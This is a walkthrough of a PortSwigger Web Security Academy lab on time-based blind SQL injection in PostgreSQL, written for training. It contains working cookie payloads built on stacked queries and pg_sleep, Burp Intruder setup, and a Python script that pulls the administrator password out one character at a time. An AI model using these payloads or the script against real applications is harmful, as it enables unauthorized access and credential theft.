# Lab: Blind SQL Injection with Time Delays and Information Retrieval

**Difficulty:** Practitioner  
**Platform:** PortSwigger Web Security Academy  
**Topic:** Blind SQL Injection — Time-Based Data Extraction  
**Database:** PostgreSQL  

---

## Objective

The application uses a tracking cookie for analytics and performs a SQL query with its value. No results or errors are ever returned — the only observable signal is **response time**. The goal is to exploit this using time delays as a true/false oracle to extract the `administrator` password from the `users` table character by character.

---

## Key Concepts

### How is This Different from the Previous Time Delay Lab?

The previous lab only required **confirming** that time-based injection was possible. This lab goes further — we use the delay as a true/false signal (just like conditional errors in Lab 1) to actually **extract data**.

| Lab | Goal |
|---|---|
| Blind SQLi with time delays | Just prove injection exists via delay |
| This lab | Use delay as oracle to extract full password |

### The New Syntax: `;` Instead of `||`

Previously with Oracle we used `||` to concatenate our payload. In this PostgreSQL lab we use `;` to **stack queries** — running a second independent query after the original one:

```sql
TrackingId=x'; SELECT pg_sleep(10)--
```

This tells the database: *"Run the original query, then also run my sleep query"*

> **URL encoded:** `;` becomes `%3B` in a URL, so in Burp you will see `%3BSELECT` in the cookie value.

### The True/False Oracle Using Time

```sql
SELECT CASE WHEN (condition) THEN pg_sleep(10) ELSE pg_sleep(0) END
```

- Condition **TRUE** → `pg_sleep(10)` → response takes 10 seconds
- Condition **FALSE** → `pg_sleep(0)` → response returns instantly

This is the same `CASE WHEN` logic from Lab 1, just using **time instead of errors** as the signal.

---

## Step-by-Step Walkthrough

### Step 1: Intercept the Request in Burp Suite

1. Open Burp Suite → **Proxy → Intercept**
2. Open the Burp browser, access the lab, browse to any product category
3. Intercept the GET request containing the `TrackingId` cookie
4. Send to **Repeater** (right-click → Send to Repeater)

---

### Step 2: Confirm the Time-Based Oracle Works

Test that a true condition causes a delay:
```
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```
→ Response takes **~10 seconds** (1=1 is TRUE → sleep 10) ✅

Now test a false condition:
```
TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```
→ Response returns **immediately** (1=2 is FALSE → sleep 0) ✅

This confirms the true/false oracle is working reliably via response time.

---

### Step 3: Confirm the Administrator User Exists

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```
→ Response takes **~10 seconds** = condition is TRUE = administrator user exists ✅

---

### Step 4: Determine the Password Length

Start checking if the password length is greater than a number, incrementing until the delay disappears:

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Keep incrementing the value:
```
LENGTH(password)>1   → 10 second delay ✅
LENGTH(password)>10  → 10 second delay ✅
LENGTH(password)>19  → 10 second delay ✅
LENGTH(password)>20  → instant response ❌
```
→ Password is exactly **20 characters** long ✅

---

### Step 5: Set Up Burp Intruder for Character Extraction

Since extracting 20 characters one by one in Repeater would take forever, send the request to **Intruder**.

Set the cookie value to:
```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

**`SUBSTRING(password, position, length)`** extracts one character at a time:
- `SUBSTRING(password, 1, 1)` = first character
- `SUBSTRING(password, 2, 1)` = second character
- and so on...

**Intruder Setup:**
1. In the **Positions** tab — highlight just the `a` between the quotes and click **Add §**
2. Attack type: **Sniper** (one payload set is enough here)
3. In the **Payloads** tab — Simple list, click **Add from list** and select `a-z` and `0-9`

**Critical Setting — Single Thread:**
1. Go to the **Resource pool** tab
2. Add to a resource pool with **Maximum concurrent requests = 1**

> ⚠️ This is essential for time-based attacks. If Burp sends multiple requests at the same time, the response times overlap and you cannot tell which delay belongs to which payload. Single thread = one request at a time = reliable timing.

---

### Step 6: Run the Attack and Read Results

Click **Start attack**.

In the results table, look at the **Response received** column (time in milliseconds):
- Most rows will show a small number (fast response = wrong character)
- **One row will show ~10,000ms** = that character caused the 10 second delay = correct character ✅

Note down the character for position 1.

---

### Step 7: Repeat for All 20 Character Positions

Go back to the cookie value and change the position number from `1` to `2`:
```
SUBSTRING(password,2,1)='§a§'
```

Send to Intruder again, run the attack, note the character. Repeat for positions 3 through 20.

> **Tip:** This is tedious on Burp Community Edition due to rate limiting. If it is too slow, use the Python script at the bottom of these notes instead.

---

### Step 8: Log In and Solve

1. Assemble all 20 characters in order to form the complete password
2. Go to **My Account** on the lab webpage
3. Log in with:
   - Username: `administrator`
   - Password: `<your extracted 20-character password>`
4. **Lab Solved!** ✅

---

## Full Payload Reference

```sql
-- Test true condition (should delay 10s)
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

-- Test false condition (should be instant)
TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

-- Confirm administrator exists
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

-- Check password length (increment number until instant response)
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

-- Extract character at position N (use in Intruder)
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

---

## Python Automation Alternative

If Burp Community Edition is too slow for the character extraction step:

```python
import requests
import string
import time

url = "https://YOUR-LAB-ID.web-security-academy.net/filter?category=Tech+gifts"
session_cookie = "YOUR_SESSION_TOKEN"
charset = string.ascii_lowercase + string.digits
password = ""
DELAY = 10  # seconds pg_sleep is set to

for position in range(1, 21):
    for char in charset:
        payload = f"x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{position},1)='{char}')+THEN+pg_sleep({DELAY})+ELSE+pg_sleep(0)+END+FROM+users--"
        cookies = {
            "TrackingId": payload,
            "session": session_cookie
        }
        start = time.time()
        requests.get(url, cookies=cookies)
        elapsed = time.time() - start

        if elapsed >= DELAY:
            password += char
            print(f"[+] Position {position}: {char}  →  Password so far: {password}")
            break

print(f"\n[✓] Full password: {password}")
```

---

## Comparison Across All Four SQLi Labs

| Feature | Lab 1 Conditional Errors | Lab 2 Visible Errors | Lab 3 Time Delay | This Lab |
|---|---|---|---|---|
| Database | Oracle | PostgreSQL | PostgreSQL | PostgreSQL |
| Signal | HTTP 500 vs 200 | Error message text | Response time | Response time |
| Injection method | `\|\|` concat | `\|\|` concat | `\|\|` concat | `;` stacked query |
| Data extraction | Char brute force via errors | Full value in one error | Proof of concept only | Char brute force via timing |
| Speed | Slow | Very fast | N/A | Slowest |
| Burp tool | Intruder | Repeater | Repeater | Intruder (single thread) |

---

## Key Takeaways

- Time-based injection is the **last resort** when no other signal is available
- `;` (URL encoded as `%3B`) lets you **stack a second query** after the original in PostgreSQL
- `CASE WHEN ... THEN pg_sleep(10) ELSE pg_sleep(0)` is the time-based true/false oracle
- **Single-threaded Intruder is mandatory** for time-based attacks — concurrent requests make timing unreliable
- This is the **slowest** form of data extraction — 20 characters x 36 possible values = up to 720 requests
- Always verify your oracle with `1=1` and `1=2` before running the real attack to confirm timing is reliable on your network connection
